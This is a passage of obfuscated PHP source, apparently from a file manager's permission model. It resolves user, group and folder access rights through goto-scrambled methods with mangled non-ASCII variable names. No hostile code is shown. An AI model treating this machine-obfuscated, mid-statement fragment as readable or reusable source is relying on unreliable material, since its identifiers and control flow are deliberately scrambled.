$this->sourceAuthSelect($d²òİ„õ“); $e­ïªà¯Ù“ = array(); foreach ($d²òİ„õ“ as $b«ºÀù¢ãÂ) { if (isset($fÒâÑƒĞëÔ[$b«ºÀù¢ãÂ])) { $e­ïªà¯Ù“[$b«ºÀù¢ãÂ] = $fÒâÑƒĞëÔ[$b«ºÀù¢ãÂ]; } } goto aµ¦»ã¿Æ; aµ¦»ã¿Æ: $f‰ù…ê¯¥¬ = $this->userIsRoot($F‚ğ±ğ‹™¤); $b‡Ê“ùÈ†Ï = AuthModel::authAll(); $AÔšâ¦ÊÛÜ = array($eä¥·ÉÚÍ[418] => $b‡Ê“ùÈ†Ï, $eä¥·ÉÚÍ[1899] => array($eä¥·ÉÚÍ[423] => 0, $eä¥·ÉÚÍ[1726] => $b‡Ê“ùÈ†Ï, $eä¥·ÉÚÍ[424] => LNG($eä¥·ÉÚÍ[1900]), $eä¥·ÉÚÍ[1742] => $eä¥·ÉÚÍ[1901])); goto fœÅäç‘°; fœÅäç‘°: $CàòŠÆä‘ = array(); foreach ($b‚³‚Ô‹Œ´ as $b«ºÀù¢ãÂ => $eŠÙŸÈ‰) { if ($f‰ù…ê¯¥¬) { $CàòŠÆä‘[$b«ºÀù¢ãÂ] = $AÔšâ¦ÊÛÜ; continue; } $CàòŠÆä‘[$b«ºÀù¢ãÂ] = $this->makeSourceAuth($eŠÙŸÈ‰, $e­ïªà¯Ù“, $F‚ğ±ğ‹™¤); } return $CàòŠÆä‘; goto Fš ÊŞÈ¶‹; FˆÈĞÏ˜Å: if (!$b‚³‚Ô‹Œ´ && count($e¯åÎ›ƒ„ù) == 1) { $b‚³‚Ô‹Œ´ = array(); $b‚³‚Ô‹Œ´[$e¯åÎ›ƒ„ù[0]] = $fá¬¯®šÙÉ->sourceInfo($e¯åÎ›ƒ„ù[0]); } if (!$b‚³‚Ô‹Œ´) { $eĞÉöÔÇˆ = array($eä¥·ÉÚÍ[421] => array($eä¥·ÉÚÍ[422], $e¯åÎ›ƒ„ù)); $b‚³‚Ô‹Œ´ = $fá¬¯®šÙÉ->field($eä¥·ÉÚÍ[1898])->where($eĞÉöÔÇˆ)->select(); $b‚³‚Ô‹Œ´ = array_to_keyvalue($b‚³‚Ô‹Œ´, $eä¥·ÉÚÍ[406]); } $d²òİ„õ“ = $e¯åÎ›ƒ„ù; goto eßò¦ìŒ‹”; e¾”¨¨ô´‘: $eä¥·ÉÚÍ =& $_SERVER[œÕÊİğö]; if (!$e¯åÎ›ƒ„ù) { return array(); } $fá¬¯®šÙÉ = Model($eä¥·ÉÚÍ[1228]); goto FˆÈĞÏ˜Å; eßò¦ìŒ‹”: foreach ($b‚³‚Ô‹Œ´ as $aìÍ‡Åä÷‘ => $D·±¦ŒâïÒ) { $EÇ–¦á—ËÆ = $fá¬¯®šÙÉ->parentLevelArray($D·±¦ŒâïÒ[$eä¥·ÉÚÍ[524]]); $d²òİ„õ“ = array_merge($d²òİ„õ“, array($aìÍ‡Åä÷‘), array_reverse($EÇ–¦á—ËÆ)); } $d²òİ„õ“ = array_values(array_unique($d²òİ„õ“)); if (!$d²òİ„õ“) { return array(); } goto aÒ†Ö…ÇÁ; Fš ÊŞÈ¶‹: } public function authDeepCheck($D‰’´«¾‡, $dºÂô¾§ø = false) { goto aé†„º­¾®; fõ°‹ë™‰À: if (!in_array($D‰’´«¾‡, $A™£ôà¡†[$AÕ›¥»ù®[1902]])) { return !1; } $cĞ’‡¡ª±Å = array(); foreach ($A™£ôà¡†[$AÕ›¥»ù®[1903]] as $f¤“Üä—ğ => $b¸³‘½‹ˆ) { if (!in_array($D‰’´«¾‡, $b¸³‘½‹ˆ)) { continue; } $cĞ’‡¡ª±Å[] = $f¤“Üä—ğ; } goto A›ÖÑÖ‹ã ; aé†„º­¾®: $AÕ›¥»ù® =& $_SERVER[œÕÊİğö]; $dºÂô¾§ø = $dºÂô¾§ø ? $dºÂô¾§ø : USER_ID; $A™£ôà¡† = $this->makeAuthDeep($dºÂô¾§ø); goto fõ°‹ë™‰À; A›ÖÑÖ‹ã : if (!$cĞ’‡¡ª±Å) { return !1; } $dàÛÊ’½Ş = $cĞ’‡¡ª±Å ? $cĞ’‡¡ª±Å[0] : $D‰’´«¾‡; return array($AÕ›¥»ù®[418] => -1, $AÕ›¥»ù®[469] => array($AÕ›¥»ù®[423] => $AÕ›¥»ù®[1107], $AÕ›¥»ù®[1726] => $AÕ›¥»ù®[201], $AÕ›¥»ù®[424] => LNG($AÕ›¥»ù®[1904]), $AÕ›¥»ù®[1742] => $AÕ›¥»ù®[1905]), $AÕ›¥»ù®[1906] => LNG($AÕ›¥»ù®[1907]), $AÕ›¥»ù®[1908] => $this->sourceAuthInfo($dàÛÊ’½Ş)); goto Dˆíô‚éš; Dˆíô‚éš: } protected function makeAuthDeep($d¹åŠËŠˆ× = false) { goto e¾çàÔ„À»; CïÁ±ƒ½«: $C‘……‹Ë› = array(); $fÄ­±‰äíô = array(); $a‰ïàåæ¬ô = array(); goto BäÏ¡Èõ’Ô; Bğ‰¥´êËó: $E–ÇŠÑñö› = array($C›¦×¾•³[1902] => $a’‚±“Á•, $C›¦×¾•³[1903] => $C‘……‹Ë›); $f—öö°ƒïİ[$d¹åŠËŠˆ×] = $E–ÇŠÑñö›; return $E–ÇŠÑñö›; goto Aš¿Î²¶ËŸ; BäÏ¡Èõ’Ô: $EÛ¨·¶ÌÅ = array(); if ($DèÆç‰’À¬) { $dĞÜÙÕÃ‡à = $EˆŠÅËˆ†í->where(array($C›¦×¾•³[406] => array($C›¦×¾•³[422], $DèÆç‰’À¬)))->select(); foreach ($dĞÜÙÕÃ‡à as $DÂç™—…Â®) { $cËòİô‹˜ = $EˆŠÅËˆ†í->parentLevelArray($DÂç™—…Â®[$C›¦×¾•³[524]]); $a’‚±“Á• = array_merge($a’‚±“Á•, $cËòİô‹˜); $D©Êåáë¶[] = $DÂç™—…Â®[$C›¦×¾•³[507]]; $C‘……‹Ë›[$DÂç™—…Â®[$C›¦×¾•³[406]]] = $cËòİô‹˜; $fÄ­±‰äíô[$DÂç™—…Â®[$C›¦×¾•³[406]]] = $DÂç™—…Â®[$C›¦×¾•³[507]]; } } $D©Êåáë¶ = array_values(array_unique($D©Êåáë¶)); goto FŠ‹ÈºÂ‘; AĞ¤³‘çìá: foreach ($bÀ™¢ÛÌ‚“ as $bŸÙ‹„¹‚) { if ($bŸÙ‹„¹‚[$C›¦×¾•³[417]] == 0 && $bŸÙ‹„¹‚[$C›¦×¾•³[1741]] == $C›¦×¾•³[97]) { $AùëŸ·äÙ[] = $bŸÙ‹„¹‚[$C›¦×¾•³[404]]; } } $f¢Ş‘®£ = $this->userGroupParents($d¹åŠËŠˆ×); $CŠ‚Å­¹Á = array($C›¦×¾•³[415] => SourceModel::TYPE_USER, $C›¦×¾•³[507] => $d¹åŠËŠˆ×); goto f™á¡•ƒå›; bˆšÌÄŞ¾Ä: if (isset($f—öö°ƒïİ[$d¹åŠËŠˆ×])) { return $f—öö°ƒïİ[$d¹åŠËŠˆ×]; } $bÀ™¢ÛÌ‚“ = Model($C›¦×¾•³[1909])->listData(); $AùëŸ·äÙ = array(); goto AĞ¤³‘çìá; e¾çàÔ„À»: $C›¦×¾•³ =& $_SERVER[œÕÊİğö]; static $f—öö°ƒïİ = array(); $d¹åŠËŠˆ× = $d¹åŠËŠˆ× ? $d¹åŠËŠˆ× : USER_ID; goto bˆšÌÄŞ¾Ä; FŠ‹ÈºÂ‘: $fÕ‘«‰Ñ¸ = $D©Êåáë¶; foreach ($fÕ‘«‰Ñ¸ as $bÂÒìÕ¸ÉÂ) { $eÎ•Ë™î = $cåéËÚÔäğ->getInfo($bÂÒìÕ¸ÉÂ); $cËòİô‹˜ = $EˆŠÅËˆ†í->parentLevelArray($eÎ•Ë™î[$C›¦×¾•³[524]]); $D©Êåáë¶ = array_merge($D©Êåáë¶, $cËòİô‹˜); } $D©Êåáë¶ = array_values(array_unique($D©Êåáë¶)); goto bæßÈğ—¬ñ; bæßÈğ—¬ñ: foreach ($D©Êåáë¶ as $bÂÒìÕ¸ÉÂ) { $eÎ•Ë™î = $cåéËÚÔäğ->getInfo($bÂÒìÕ¸ÉÂ); $a’‚±“Á•[] = $eÎ•Ë™î[$C›¦×¾•³[95]][$C›¦×¾•³[406]]; $a‰ïàåæ¬ô[$bÂÒìÕ¸ÉÂ] = $eÎ•Ë™î[$C›¦×¾•³[95]][$C›¦×¾•³[406]]; $EÛ¨·¶ÌÅ[$bÂÒìÕ¸ÉÂ] = $EˆŠÅËˆ†í->parentLevelArray($eÎ•Ë™î[$C›¦×¾•³[524]]); } foreach ($C‘……‹Ë› as $b¹™¨£­šÎ => $cÄãøæ¢Š) { $fôÁİÁÛÕğ = $fÄ­±‰äíô[$b¹™¨£­šÎ]; if (!$fôÁİÁÛÕğ || !$a‰ïàåæ¬ô[$fôÁİÁÛÕğ]) { continue; } $dôÚ¬”İÁ = array(); foreach ($EÛ¨·¶ÌÅ[$fôÁİÁÛÕğ] as $bÂÒìÕ¸ÉÂ) { $dôÚ¬”İÁ[] = $a‰ïàåæ¬ô[$bÂÒìÕ¸ÉÂ]; } $C‘……‹Ë›[$b¹™¨£­šÎ] = array_merge($dôÚ¬”İÁ, $cÄãøæ¢Š); } $a’‚±“Á• = array_values(array_unique($a’‚±“Á•)); goto Bğ‰¥´êËó; cãç©‡™‚¿: $fÙæÃ…ì¦Œ = array_to_keyvalue_group($C¦¦»Ù†¿ˆ, $C›¦×¾•³[406]); foreach ($fÙæÃ…ì¦Œ as $bêƒƒÉŒ—ö => $cÂº†”¶õ) { $BòËö÷¿ğ = $this->authArrayCheck($cÂº†”¶õ, $d¹åŠËŠˆ×); if ($BòËö÷¿ğ[$C›¦×¾•³[418]] > 0) { $DèÆç‰’À¬[] = $bêƒƒÉŒ—ö . $C›¦×¾•³[43]; } } $a’‚±“Á• = array(); goto aê‡ŞÁâèÜ; f™á¡•ƒå›: if ($f¢Ş‘®£) { $CŠ‚Å­¹Á = array(array($C›¦×¾•³[415] => SourceModel::TYPE_USER, $C›¦×¾•³[507] => $d¹åŠËŠˆ×), array($C›¦×¾•³[415] => SourceModel::TYPE_GROUP, $C›¦×¾•³[507] => array($C›¦×¾•³[422], $f¢Ş‘®£)), $C›¦×¾•³[981] => $C›¦×¾•³[1812]); } $C¦¦»Ù†¿ˆ = $this->field($C›¦×¾•³[1910])->where($CŠ‚Å­¹Á)->select(); $DèÆç‰’À¬ = array(); goto cãç©‡™‚¿; aê‡ŞÁâèÜ: $D©Êåáë¶ = $f¢Ş‘®£; $EˆŠÅËˆ†í = Model($C›¦×¾•³[1228]); $cåéËÚÔäğ = Model($C›¦×¾•³[525]); goto CïÁ±ƒ½«; Aš¿Î²¶ËŸ: } private function makeSourceAuth($C§“°ÏÁ¡Â, $Dõ³›¡Ö£ã, $fâ‡¤ß¿ÜŸ = false) { goto fŠ‘İÖÒ÷; c˜İÓßë†: if (!$F¼èê‡¡à) { $FËö¯Ûø¦Ñ = Model($cµ¨ £ è¸[525])->getInfo($aŸä™àÔ°Ì); $D†Öï¸¬Ò„ = explode($cµ¨ £ è¸[57], trim($FËö¯Ûø¦Ñ[$cµ¨ £ è¸[524]], $cµ¨ £ è¸[57])); $D†Öï¸¬Ò„ = array_reverse($D†Öï¸¬Ò„); foreach ($D†Öï¸¬Ò„ as $FªÇ´÷˜¨î) { if ($FªÇ´÷˜¨î == $cµ¨ £ è¸[201] || $FªÇ´÷˜¨î == $dìÂ÷ÑŠ) { continue; } $a†¦¶©´İÙ = $this->groupRootAuth($FªÇ´÷˜¨î, $fâ‡¤ß¿ÜŸ); if (!$a†¦¶©´İÙ) { continue; } $F¼èê‡¡à = $this->groupAuthInfo($a†¦¶©´İÙ, $FªÇ´÷˜¨î); break; } } if (!$F¼èê‡¡à || $F¼èê‡¡à[$cµ¨ £ è¸[418]] <= 0) { $Cô¹ŸÆ¥Ü§ = $this->authDeepCheck($C§“°ÏÁ¡Â[$cµ¨ £ è¸[406]], $fâ‡¤ß¿ÜŸ); if ($Cô¹ŸÆ¥Ü§) { $F¼èê‡¡à = $Cô¹ŸÆ¥Ü§; } } return $F¼èê‡¡à; goto B‰Ó›ù‘£Ì; e¬‘†àÃ’é: $A’©ÕÅÌºÏ = Model($cµ¨ £ è¸[1228])->parentLevelArray($C§“°ÏÁ¡Â[$cµ¨ £ è¸[524]]); $A’©ÕÅÌºÏ = array_merge(array($C§“°ÏÁ¡Â[$cµ¨ £ è¸[406]]), array_reverse($A’©ÕÅÌºÏ)); $F¼èê‡¡à = !1; goto bå©Á‹”ùÏ; fŠ‘İÖÒ÷: $cµ¨ £ è¸ =& $_SERVER[œÕÊİğö]; $dìÂ÷ÑŠ = $cµ¨ £ è¸[97]; $aŸä™àÔ°Ì = $C§“°ÏÁ¡Â[$cµ¨ £ è¸[507]]; goto A‚Ğ¹İòÏ¬; A‚Ğ¹İòÏ¬: $BõíøÅ‹æ = $C§“°ÏÁ¡Â[$cµ¨ £ è¸[415]] == SourceModel::TYPE_GROUP; $e¶ÁÇ†Øö½ = $BõíøÅ‹æ ? $this->groupRootAuth($aŸä™àÔ°Ì, $fâ‡¤ß¿ÜŸ) : !1; if ($e¶ÁÇ†Øö½ && Model($cµ¨ £ è¸[510])->authCheckAction($e¶ÁÇ†Øö½[$cµ¨ £ è¸[417]], $cµ¨ £ è¸[1740])) { return $this->groupAuthInfo($e¶ÁÇ†Øö½, $aŸä™àÔ°Ì); } goto e¬‘†àÃ’é; bå©Á‹”ùÏ: foreach ($A’©ÕÅÌºÏ as $DÍà‘öÛ¬Ê) { if (!isset($Dõ³›¡Ö£ã[$DÍà‘öÛ¬Ê])) { continue; } $bÉÉïğ’× = $this->authMake($Dõ³›¡Ö£ã[$DÍà‘öÛ¬Ê], $fâ‡¤ß¿ÜŸ); if ($bÉÉïğ’×[$cµ¨ £ è¸[469]]) { $F¼èê‡¡à = $bÉÉïğ’×; break; } } if (!$BõíøÅ‹æ) { return $F¼èê‡¡à; } if (!$F¼èê‡¡à && $e¶ÁÇ†Øö½) { $F¼èê‡¡à = $this->groupAuthInfo($e¶ÁÇ†Øö½, $aŸä™àÔ°Ì); } goto c˜İÓßë†; B‰Ó›ù‘£Ì: } private function userIsRoot($bÖ¦‰Ä…‘Å = false) { $a«ºÊØä =& $_SERVER[œÕÊİğö]; if (!$bÖ¦‰Ä…‘Å && _get($GLOBALS, $a«ºÊØä[508])) { return !0; } $bëîºÏíÕ = Model($a«ºÊØä[541])->getInfo($bÖ¦‰Ä…‘Å); $dËöä¶ÏĞì = Model($a«ºÊØä[1911])->listData($bëîºÏíÕ[$a«ºÊØä[1432]]); if ($dËöä¶ÏĞì && $dËöä¶ÏĞì[$a«ºÊØä[514]][$a«ºÊØä[1912]] == 1) { return !0; } return !1; } private function sourceAuthInfo($b×ËĞ’…É) { goto E Ö‡¬–è; Eîªùà‚åÁ: if (isset($BÂ¦ÈÇâ¿[$A†ŠŒ««Ä­[530]])) { $DœÒ–Å²± = explode($A†ŠŒ««Ä­[8], trim($BÂ¦ÈÇâ¿[$A†ŠŒ««Ä­[522]], $A†ŠŒ««Ä­[8])); array_shift($DœÒ–Å²±); $EôçÄ¤¹² = $BÂ¦ÈÇâ¿[$A†ŠŒ««Ä­[528]] . $A†ŠŒ««Ä­[1913] . implode($A†ŠŒ««Ä­[8], $DœÒ–Å²±); } return array($A†ŠŒ««Ä­[424] => $BÂ¦ÈÇâ¿[$A†ŠŒ««Ä­[38]], $A†ŠŒ««Ä­[86] => KodIO::make($BÂ¦ÈÇâ¿[$A†ŠŒ««Ä­[406]]), $A†ŠŒ««Ä­[1914] => $EôçÄ¤¹²); goto aŠôîäÕ‹É; bá˜‚©˜İ: if (!$BÂ¦ÈÇâ¿) { return !1; } $E´ìØø‰’—->groupPathDisplay($BÂ¦ÈÇâ¿); $AšÁŠ§…îÄ = array($BÂ¦ÈÇâ¿); goto e­½ÃçòŞ; E Ö‡¬–è: $A†ŠŒ««Ä­ =& $_SERVER[œÕÊİğö]; $E´ìØø‰’— = Model($A†ŠŒ««Ä­[1228]); $BÂ¦ÈÇâ¿ = $E´ìØø‰’—->sourceInfo($b×ËĞ’…É); goto bá˜‚©˜İ; e­½ÃçòŞ: $AšÁŠ§…îÄ = $E´ìØø‰’—->_listAppendPath($AšÁŠ§…îÄ); $BÂ¦ÈÇâ¿ = $AšÁŠ§…îÄ[0]; $EôçÄ¤¹² = $BÂ¦ÈÇâ¿[$A†ŠŒ««Ä­[522]]; goto Eîªùà‚åÁ; aŠôîäÕ‹É: } private function groupAuthInfo($e¢ÖÖ®Œ§³, $e­£­”ö) { $f‚÷ÜÆ­Œ… =& $_SERVER[œÕÊİğö]; $Eî—ƒŠà” = Model($f‚÷ÜÆ­Œ…[525])->getInfo($e­£­”ö); return array($f‚÷ÜÆ­Œ…[1915] => intval($e¢ÖÖ®Œ§³[$f‚÷ÜÆ­Œ…[417]]), $f‚÷ÜÆ­Œ…[1899] => $e¢ÖÖ®Œ§³, $f‚÷ÜÆ­Œ…[1916] => LNG($f‚÷ÜÆ­Œ…[1917]), $f‚÷ÜÆ­Œ…[1908] => array($f‚÷ÜÆ­Œ…[424] => $Eî—ƒŠà”[$f‚÷ÜÆ­Œ…[38]], $f‚÷ÜÆ­Œ…[86] => KodIO::make($Eî—ƒŠà”[$f‚÷ÜÆ­Œ…[95]][$f‚÷ÜÆ­Œ…[406]]), $f‚÷ÜÆ­Œ…[1914] => $Eî—ƒŠà”[$f‚÷ÜÆ­Œ…[529]])); } protected function groupRootAuth($Aöì¼ÀšÏ¶, $EÌààÎ¡¶Ë = false) { goto C“É´¥¯Œ³; d‘‹öğ˜†›: $E‚ÉÍ¨ô¾£[$bßÑÓÜ‘Ö] = $d„ç½Øù® ? $d„ç½Øù® : $fç½èƒöİ×; return $E‚ÉÍ¨ô¾£[$bßÑÓÜ‘Ö]; goto bñ·‰ÚŒÖ; BÍˆíÖ¿ãÓ: $A²ƒÂÚ›Êù = $this->sourceAuthSelect($bÙ…ãáóà[$AèÜ‰ÅŠ˜[95]][$AèÜ‰ÅŠ˜[406]]); $c­ßÚ™´« = $A²ƒÂÚ›Êù ? $this->authMake($A²ƒÂÚ›Êù, $EÌààÎ¡¶Ë) : !1; $d„ç½Øù® = $c­ßÚ™´« ? $c­ßÚ™´«[$AèÜ‰ÅŠ˜[469]] : !1; goto d‘‹öğ˜†›; FØÔ¸È°àŞ: $aŞàšÄ–ØÈ = $this->userGroupList($EÌààÎ¡¶Ë); $fç½èƒöİ× = isset($aŞàšÄ–ØÈ[$Aöì¼ÀšÏ¶]) ? $aŞàšÄ–ØÈ[$Aöì¼ÀšÏ¶][$AèÜ‰ÅŠ˜[417]] : !1; if ($fç½èƒöİ× && Model($AèÜ‰ÅŠ˜[510])->authCheckAction($fç½èƒöİ×[$AèÜ‰ÅŠ˜[417]], $AèÜ‰ÅŠ˜[1740])) { $E‚ÉÍ¨ô¾£[$bßÑÓÜ‘Ö] = $fç½èƒöİ×; return $fç½èƒöİ×; } goto BÍˆíÖ¿ãÓ; D×‹‘¯‹‰: static $E‚ÉÍ¨ô¾£ = array(); if (isset($E‚ÉÍ¨ô¾£[$bßÑÓÜ‘Ö])) { return $E‚ÉÍ¨ô¾£[$bßÑÓÜ‘Ö]; } $bÙ…ãáóà = Model($AèÜ‰ÅŠ˜[525])->getInfo($Aöì¼ÀšÏ¶); goto FØÔ¸È°àŞ; C“É´¥¯Œ³: $AèÜ‰ÅŠ˜ =& $_SERVER[œÕÊİğö]; $EÌààÎ¡¶Ë = $EÌààÎ¡¶Ë ? $EÌààÎ¡¶Ë : USER_ID; $bßÑÓÜ‘Ö = $EÌààÎ¡¶Ë . $AèÜ‰ÅŠ˜[1918] . $Aöì¼ÀšÏ¶; goto D×‹‘¯‹‰; bñ·‰ÚŒÖ: } public function authOwnerApply($Aæ×˜Œå©¾) { goto bÊàíµ§¨¯; e¬Îçƒ­Ã‚: if (count($eâªòºğ») == 0) { $eâªòºğ» = $this->authFolderOwnerGroup($Aæ×˜Œå©¾[$AƒŒñ¹­[507]]); } $eâªòºğ» = array_unique($eâªòºğ»); if (AuthModel::authCheckRoot($Aæ×˜Œå©¾[$AƒŒñ¹­[417]][$AƒŒñ¹­[418]])) { $eâªòºğ»[] = USER_ID; } goto eëáÇéîÍ; bÊàíµ§¨¯: $AƒŒñ¹­ =& $_SERVER[œÕÊİğö]; if (empty($Aæ×˜Œå©¾[$AƒŒñ¹­[417]]) || isset($Aæ×˜Œå©¾[$AƒŒñ¹­[1919]]) && $Aæ×˜Œå©¾[$AƒŒñ¹­[1919]]) { return $Aæ×˜Œå©¾; } if (AuthModel::authCheckRoot($Aæ×˜Œå©¾[$AƒŒñ¹­[417]][$AƒŒñ¹­[418]])) { return $Aæ×˜Œå©¾; } goto D¹›ìñ—éó; D¹›ìñ—éó: $B¢ÖÊîÑ…© = Model($AƒŒñ¹­[1228])->parentLevelArray($Aæ×˜Œå©¾[$AƒŒñ¹­[524]]); $B¢ÖÊîÑ…© = array_merge(array($Aæ×˜Œå©¾[$AƒŒñ¹­[406]]), array_reverse($B¢ÖÊîÑ…©)); $D¹¿ØÌğ«Â = $this->sourceAuthSelect($B¢ÖÊîÑ…©); goto FŞÌÛ—î—Ï; FŞÌÛ—î—Ï: $DÊœÆÎ¸Ç = array(); $eâªòºğ» = array(); foreach ($D¹¿ØÌğ«Â as $F„Í°Üƒ±å => $eËÉù¼ÖÇß) { $cÎÊ´“ï«¼ = $this->authFolderOwnerUser($eËÉù¼ÖÇß); $DÊœÆÎ¸Ç[$F„Í°Üƒ±å] = $cÎÊ´“ï«¼; $eâªòºğ» = array_merge($eâªòºğ», $cÎÊ´“ï«¼[$AƒŒñ¹­[597]]); if ($cÎÊ´“ï«¼[$AƒŒñ¹­[1920]]) { break; } } goto e¬Îçƒ­Ã‚; eëáÇéîÍ: $Aæ×˜Œå©¾[$AƒŒñ¹­[417]][$AƒŒñ¹­[1921]] = Model($AƒŒñ¹­[516])->userListInfo($eâªòºğ»); return $Aæ×˜Œå©¾; goto fÍ›‚„Êù; fÍ›‚„Êù: } private function authFolderOwnerGroup($AÊ†ÎŒ¬¢) { $B¢„‰¾ôÑ° =& $_SERVER[œÕÊİğö]; $DìÇ¾ğõ = Model($B¢„‰¾ôÑ°[1806])->where(array($B¢„‰¾ôÑ°[1720] => $AÊ†ÎŒ¬¢))->select(); $E¼Ããé©šá = array(); if (!$DìÇ¾ğõ) { return $E¼Ããé©šá; } foreach ($DìÇ¾ğõ as $b†¿Ì°İÇ•) { $aÉóŞÕÌİÄ = $this->authInfo($b†¿Ì°İÇ•); if (AuthModel::authCheckRoot($aÉóŞÕÌİÄ[$B¢„‰¾ôÑ°[417]])) { $E¼Ããé©šá[] = $b†¿Ì°İÇ•[$B¢„‰¾ôÑ°[1551]]; } } return $E¼Ããé©šá; } private function authFolderOwnerUser($bÀµÎÜÚêß) { $EÄÙ°ÃÛ¡¼ =& $_SERVER[œÕÊİğö]; $c¶ÚŞöù = array(); $C¹¥…¸‘¼â = !1; foreach ($bÀµÎÜÚêß as $F·°ƒĞÂÉí) { $Aì›ÆÁÖ„ = $this->authInfo($F·°ƒĞÂÉí); if ($F·°ƒĞÂÉí[$EÄÙ°ÃÛ¡¼[507]] == $EÄÙ°ÃÛ¡¼[201]) { $C¹¥…¸‘¼â = !0; } if ($F·°ƒĞÂÉí[$EÄÙ°ÃÛ¡¼[415]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Aì›ÆÁÖ„[$EÄÙ°ÃÛ¡¼[417]])) { $c¶ÚŞöù[] = $F·°ƒĞÂÉí[$EÄÙ°ÃÛ¡¼[507]]; } } } return array($EÄÙ°ÃÛ¡¼[597] => $c¶ÚŞöù, $EÄÙ°ÃÛ¡¼[1920] => $C¹¥…¸‘¼â); } public function authMake($CŒµ¬Ÿ§Ò», $E½Âì¶Í´Ç = false) { $B¹Î˜¨¦Û“ =& $_SERVER[œÕÊİğö]; $b‘Ìõƒ‚É = $this->authArrayCheck($CŒµ¬Ÿ§Ò», $E½Âì¶Í´Ç); if ($b‘Ìõƒ‚É[$B¹Î˜¨¦Û“[1922]]) { $b‘Ìõƒ‚É[$B¹Î˜¨¦Û“[1922]] = $this->sourceAuthInfo($b‘Ìõƒ‚É[$B¹Î˜¨¦Û“[1922]]); } return $b‘Ìõƒ‚É; } public function authArrayCheck($cöòÒ´Ùğ, $Fôëç…ª—„ = false) { goto aÛ »Â¥—; D‹×¤Ä¨ÄÕ: $a—õ™¦Òê = 0; $BµÌ‰á¹à = 0; $E®”•Œ„¥à = array($fëĞ½ŠÑ‡ˆ[406] => 0); goto b¶‡†Àù‹Í; fñº‹ÊÖ: $F©ùàõª†À = 0; $e±³³ÍëÇÎ = 0; $c¥²«îÇ£Ü = 0; goto E¦Üçö®¦; b¶‡†Àù‹Í: foreach ($cöòÒ´Ùğ as $E®”•Œ„¥à) { $aóÌÊ× ¡— = $this->authInfo($E®”•Œ„¥à); if (!$aóÌÊ× ¡—) { continue; } $b¹êÀÕ¸ñ = $E®”•Œ„¥à[$fëĞ½ŠÑ‡ˆ[507]]; $FÑòÍ ×ºã = intval($aóÌÊ× ¡—[$fëĞ½ŠÑ‡ˆ[417]]); if ($E®”•Œ„¥à[$fëĞ½ŠÑ‡ˆ[415]] == SourceModel::TYPE_USER && $b¹êÀÕ¸ñ == $Fôëç…ª—„) { $BšÚÍïÉ› = !0; $Dá¾ÄéÉøå = $aóÌÊ× ¡—; $D‰„Ü¥ÚÇ„ = $FÑòÍ ×ºã; } else { if ($E®”•Œ„¥à[$fëĞ½ŠÑ‡ˆ[415]] == SourceModel::TYPE_GROUP && $this->groupContainUser($b¹êÀÕ¸ñ, $Fôëç…ª—„)) { $F©ùàõª†À = !0; $D½¥†Ù´ò› = $this->groupStepToUserGroup($b¹êÀÕ¸ñ, $Fôëç…ª—„); if ($D½¥†Ù´ò› < $cÂê¡Ú¦ôõ) { $cÂê¡Ú¦ôõ = $D½¥†Ù´ò›; $e±³³ÍëÇÎ = $FÑòÍ ×ºã; $c¥²«îÇ£Ü = $aóÌÊ× ¡—; $BàÚ‘‘¦† = $b¹êÀÕ¸ñ; } if ($D½¥†Ù´ò› == $cÂê¡Ú¦ôõ && $FÑòÍ ×ºã >= $e±³³ÍëÇÎ) { $e±³³ÍëÇÎ = $FÑòÍ ×ºã; $c¥²«îÇ£Ü = $aóÌÊ× ¡—; $BàÚ‘‘¦† = $b¹êÀÕ¸ñ; } } else { if ($b¹êÀÕ¸ñ == $fëĞ½ŠÑ‡ˆ[201]) { $bÏÉÊñæËÅ = !0; $BµÌ‰á¹à = $aóÌÊ× ¡—; $a—õ™¦Òê = $FÑòÍ ×ºã; } } } } if ($BšÚÍïÉ›) { $Eöã»ëñÅ– = $D‰„Ü¥ÚÇ„; $aóÌÊ× ¡— = $Dá¾ÄéÉøå; $f¸á˜ÊµÈæ = LNG($fëĞ½ŠÑ‡ˆ[1923]); } else { if ($F©ùàõª†À) { $Eöã»ëñÅ– = $e±³³ÍëÇÎ; $aóÌÊ× ¡— = $c¥²«îÇ£Ü; $d½Ñç®™ªº = Model($fëĞ½ŠÑ‡ˆ[525])->getInfo($BàÚ‘‘¦†); $f¸á˜ÊµÈæ = $fëĞ½ŠÑ‡ˆ[170] . $d½Ñç®™ªº[$fëĞ½ŠÑ‡ˆ[529]] . $fëĞ½ŠÑ‡ˆ[1924] . LNG($fëĞ½ŠÑ‡ˆ[1925]); } else { if ($bÏÉÊñæËÅ) { $Eöã»ëñÅ– = $a—õ™¦Òê; $aóÌÊ× ¡— = $BµÌ‰á¹à; $f¸á˜ÊµÈæ = LNG($fëĞ½ŠÑ‡ˆ[1896]); } else { $Eöã»ëñÅ– = 0; $aóÌÊ× ¡— = !1; $f¸á˜ÊµÈæ = $fëĞ½ŠÑ‡ˆ[43]; } } } $D£ïÜÃ°¾ = array($fëĞ½ŠÑ‡ˆ[1915] => intval($Eöã»ëñÅ–), $fëĞ½ŠÑ‡ˆ[1899] => $aóÌÊ× ¡—, $fëĞ½ŠÑ‡ˆ[1916] => $f¸á˜ÊµÈæ, $fëĞ½ŠÑ‡ˆ[1908] => $E®”•Œ„¥à[$fëĞ½ŠÑ‡ˆ[406]]); goto Aßù±Ú—Æ; aÛ »Â¥—: $fëĞ½ŠÑ‡ˆ =& $_SERVER[œÕÊİğö]; if (!$cöòÒ´Ùğ) { return array($fëĞ½ŠÑ‡ˆ[418] => 0, $fëĞ½ŠÑ‡ˆ[469] => !1); } $Fôëç…ª—„ = $Fôëç…ª—„ ? $Fôëç…ª—„ : USER_ID; goto FÅ˜ß¨¯; FÅ˜ß¨¯: $BšÚÍïÉ› = 0; $D‰„Ü¥ÚÇ„ = 0; $Dá¾ÄéÉøå = 0; goto fñº‹ÊÖ; Aßù±Ú—Æ: return $D£ïÜÃ°¾; goto E¢Ãšë‘ä; E¦Üçö®¦: $cÂê¡Ú¦ôõ = 1000; $BàÚ‘‘¦† = 0; $bÏÉÊñæËÅ = 0; goto D‹×¤Ä¨ÄÕ; E¢Ãšë‘ä: } private function groupContainUser($DÚ‰Ò±šº, $bŞ½×Ğ©‡“ = false) { return in_array($DÚ‰Ò±šº, $this->userGroupParents($bŞ½×Ğ©‡“)); } private function groupStepToUserGroup($b¤¼­Ã±³ó, $cƒç—†µÉİ = false) { goto fÕÌÛ‹†¬Ó; BĞ’—âÛ¼„: $câÌÉ‹çêÁ = $GLOBALS[$eÄÏ°„µ¼·[6]][$eÄÏ°„µ¼·[98]][$eÄÏ°„µ¼·[1817]] == 1; $D÷†²­ï£Å = 